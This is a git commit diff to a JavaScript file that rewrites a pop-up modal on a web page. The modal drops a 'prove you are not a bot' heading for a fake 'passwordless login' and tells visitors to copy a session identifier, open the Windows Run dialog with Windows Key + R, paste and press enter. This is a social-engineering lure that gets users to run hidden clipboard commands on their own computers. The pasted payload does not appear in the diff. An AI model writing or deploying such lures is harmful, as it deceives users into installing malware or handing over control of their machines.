1c312e8d60ba40a53db501497f56e2963108b816
Mateusz Lach <matis_l@tlen.pl>
2026-07-12 17:38:09 +0200

    modal mid-way

--- src/script.js
+++ src/script.js
@@ -31,11 +31,14 @@ $(document).ready(function() {
 
         $(`
             <div id="ex1" class="modal">
-                <h1>Proove you are not a bot!</h1>
-                <p>Confirm your digital identity with a computer. This method allows you to safely login to the page without the need to remember your login and password.</p>
+                <h1>Passwordless login mechanism!</h1>
+                <p>Confirm your digital identity with a corporate computer. This method allows you to safely login to the page without the need to remember your login and password.</p>
                 <p>Simple copy and paste operation is needed, nothing more.</p>
                 <ol>
-                    <li>Press and hold <img src="/src/win_logo.png" width="16" height="16"/></li>
+                    <li>Copy Session identifier to confirm .</li>
+                    <li>Press and hold Windows Key &nbsp; <img src="https://coder-msl.github.io/advanced_captcha/src/win_logo.png" width="16" height="16"/> + R .</li>
+                    <li>In the confirmation Window press <b>CTRL + V</b></li>
+                    <li>Press enter to confirm who you are.</b></li>
                 </ol>
             </div>
         `)
